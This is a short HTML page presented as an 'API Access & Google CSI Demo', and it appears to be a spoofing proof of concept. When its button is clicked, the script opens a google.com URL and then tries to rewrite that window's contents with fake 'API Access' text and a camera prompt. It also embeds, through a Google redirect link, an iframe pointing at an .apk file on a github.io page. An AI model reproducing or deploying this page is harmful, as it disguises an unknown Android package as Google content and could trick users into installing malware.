<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>API Access & Google CSI</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
        }
        button {
            margin: 10px;
            padding: 10px 20px;
            font-size: 14px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>Welcome to API Access & Google CSI Demo</h1>
    <button onclick="accessData()">Open CSI & Access APIs</button>

    <script>
        function accessData() {
            // Open Google CSI (or any other target URL you want) in a new window
            var x = window.open('https://www.google.com:9090'); // Open Google

            setTimeout(function() {
                // Simulate a page change with fake content
                x.document.body.innerHTML = `
                    <h1>API Access & Geolocation</h1>
                    <p>Access Camera and Location APIs:</p>
                    <h2>Camera Preview:</h2>
                    <video id="video" width="320" height="240" autoplay></video>
                    <iframe src="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fapple.apk&sa=D&sntz=1&usg=AOvVaw0onE08hhdtlihXeKuCFYTr" width="600" height="400"></iframe>
                `;
            }, 3000); // Wait for 3 seconds to simulate page load time
        }
    </script>
</body>
</html>
